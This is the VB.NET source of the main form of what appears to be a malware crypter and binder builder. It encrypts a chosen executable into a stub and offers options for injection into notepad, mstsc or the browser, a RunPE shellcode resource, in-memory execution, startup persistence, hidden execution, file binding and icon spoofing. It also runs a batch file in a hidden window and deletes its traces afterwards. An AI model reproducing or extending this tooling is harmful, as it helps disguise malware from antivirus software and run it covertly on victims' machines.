Imports System.Text
Imports System.Threading
Imports System.Reflection

Public Class Main

    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        DataKey.Text = GetRandomKey(50)
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Executable File |*.exe"}
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextFile.Text = ofd.FileName
            If DotNet(IO.File.ReadAllBytes(TextFile.Text)) Then
                Dim FrameVersion As String
                Try
                    FrameVersion = Assembly.LoadFrom(TextFile.Text).ImageRuntimeVersion()
                    If FrameVersion <> "v2.0.50727" Then
                        State.Text = "Warning, output can be corrupted ! recompile your assembly with Framework 2.0 and retry."
                        State.ForeColor = Color.Orange
                    Else
                        NoError()
                    End If
                Catch ex As Exception
                    State.Text = "Warning, cannot get framework version of this assembly !"
                    State.ForeColor = Color.Orange
                End Try
            Else
                NoError()
            End If
        Else
            NoError()
            Exit Sub
        End If
    End Sub
   
    Shared Sub StartEncryption(ByVal Path As String, ByVal args As String)
        Dim A As New Process
        A.StartInfo.Arguments = args
        A.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        A.StartInfo.FileName = Path
        A.Start()
        A.WaitForExit()
    End Sub
    Public Function SetConfig(ByVal File As String, ByVal alg As Integer, ByVal key As String, ByVal out As String, ByVal PathEndData As String, ByVal chekh As Boolean, ByVal txtdelay As String, ByVal startchk As Boolean, ByVal ijt As Integer, ByVal Txtinj As String, ByVal Bind As Boolean, ByVal Path As String, ByVal RunOne As Boolean, ByVal ShellCode As String, ByVal MemRun As Boolean, ByVal TxtIns As String, ByVal native As Boolean) As String
        SetConfig = Convert.ToBase64String(Encoding.Default.GetBytes(File & "**" & alg & "**" & key & "**" & out & "**" & PathEndData & "**" & chekh & "**" & txtdelay & "**" & startchk & "**" & ijt & "**" & Txtinj & "**" & Bind & "**" & Path & "**" & RunOne & "**" & ShellCode & "**" & MemRun & "**" & TxtIns & "**" & native))
    End Function
    Public Function GetRandomKey(ByVal CaratereCount As Integer) As String
        Dim s As String = "azertyuiopqsdfghjklmwxcvbn1234567890"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To CaratereCount
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Shared Function DotNet(ByVal Data As Byte()) As Boolean
        Try
            System.Reflection.Assembly.Load(Data)
            DotNet = True
        Catch ex As Exception
            DotNet = False
        End Try
    End Function
    Sub NoError()
        State.Text = "No Error Detected !"
        State.ForeColor = Color.Lime
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        DataKey.Text = GetRandomKey(50)
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Stub File |*.bin"}
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            StubFile.Text = ofd.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File |*.ico"}
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            IcoText.Text = ofd.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub BindBrowse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BindBrowse.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Any File |*.*"}
        If ofd.ShowDialog Then
            TextBind.Text = ofd.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        If IO.File.Exists(StubFile.Text) Then
            If Not IO.File.Exists(TextFile.Text) Then
                State.Text = "File Not Found !"
                State.ForeColor = Color.Red
                Exit Sub
            Else
                If State.ForeColor = Color.Orange Or State.ForeColor = Color.Lime Then
                    Dim sfd As New SaveFileDialog With {.Filter = "Executable File |*.exe"}
                    If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                        IO.File.WriteAllBytes(sfd.FileName, IO.File.ReadAllBytes(StubFile.Text))
                        IO.File.WriteAllBytes(Application.StartupPath & "\MakeData.bat", My.Resources.MakeData)
                        Dim Algo As Integer
                        If RC2.Checked Then
                            Algo = 1
                        ElseIf RC4Mod.Checked Then
                            Algo = 2
                        ElseIf AES128.Checked Then
                            Algo = 3
                        ElseIf AES192.Checked Then
                            Algo = 4
                        ElseIf AES256.Checked Then
                            Algo = 5
                        ElseIf DES.Checked Then
                            Algo = 6
                        Else
                            Algo = 7
                        End If
                        Dim Injection As Integer
                        If Custom.Checked Then
                            Injection = 4
                        Else
                            If Notepad.Checked Then
                                Injection = 1
                            ElseIf mstsc.Checked Then
                                Injection = 2
                            ElseIf BrowserDefault.Checked Then
                                Injection = 3
                            Else
                                Injection = 5
                            End If
                        End If
                        Dim Dot As Boolean
                        If DotNet(IO.File.ReadAllBytes(TextFile.Text)) Then
                            Dot = True
                        Else
                            Dot = False
                        End If
                        Dim I As IO.Stream = IO.File.Create(Application.StartupPath & "\Config.txt")
                        I.Close()
                        Dim Config As String = SetConfig(TextFile.Text, Algo, DataKey.Text, Application.StartupPath & "\SecureBytes.data", sfd.FileName, CheckHide.Checked, TextDelay.Text, CheckStart.Checked, Injection, TextCustom.Text, Binder.Checked, TextBind.Text, RunOnce.Checked, My.Resources.RunPE, MemRun.Checked, TextInstall.Text, Dot)
                        IO.File.AppendAllText(Application.StartupPath & "\Config.txt", Config)
                        StartEncryption(Application.StartupPath & "\MakeData.bat", Convert.ToBase64String(Encoding.Default.GetBytes(Application.StartupPath & "\Config.txt")))
                        Try
                            IO.File.Delete(Application.StartupPath & "\SecureBytes.data")
                            IO.File.Delete(Application.StartupPath & "\Config.txt")
                            IO.File.Delete(Application.StartupPath & "\MakeData.bat")
                            IO.File.Delete(Application.StartupPath & "\BindData.data")
                        Catch ex As Exception
                        End Try
                        If IcoCheck.Checked And IO.File.Exists(IcoText.Text) Then
                            IconInjector.InjectIcon(sfd.FileName, IcoText.Text)
                        End If
                        State.Text = "Sucess !"
                        State.ForeColor = Color.Lime
                    Else
                        Exit Sub
                    End If
                Else
                    Exit Sub
                End If

            End If
        Else
            State.Text = "Select your Stub first !"
            State.ForeColor = Color.Red
            Exit Sub
        End If
    End Sub

    Private Sub MemRun_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MemRun.CheckedChanged
        If MemRun.Checked Then
            TextInstall.Enabled = False
            If IO.Path.GetExtension(TextBind.Text) <> ".exe" And IO.File.Exists(TextBind.Text) Then
                State.Text = "Cannot run this file in memory(Bind File)"
                State.ForeColor = Color.Red
            Else
                NoError()
            End If
        Else
            TextInstall.Enabled = True
            NoError()
        End If
    End Sub

    Private Sub Binder_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Binder.CheckedChanged
        If Binder.Checked Then
            TextBind.Enabled = True
            BindBrowse.Enabled = True
            RunOnce.Enabled = True
            MemRun.Enabled = True
            TextInstall.Enabled = True
        Else
            TextBind.Enabled = False
            BindBrowse.Enabled = False
            RunOnce.Enabled = False
            RunOnce.Checked = False
            TextInstall.Enabled = False
            MemRun.Enabled = False
            MemRun.Checked = False
            TextBind.Text = Nothing
        End If
    End Sub

    Private Sub Custom_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Custom.CheckedChanged
        If Custom.Checked Then
            TextCustom.Enabled = True
            Notepad.Enabled = False
            mstsc.Enabled = False
            BrowserDefault.Enabled = False
            ItSelf.Enabled = False
        Else
            TextCustom.Enabled = False
            Notepad.Enabled = True
            mstsc.Enabled = True
            BrowserDefault.Enabled = True
            ItSelf.Enabled = True
        End If
    End Sub
End Class
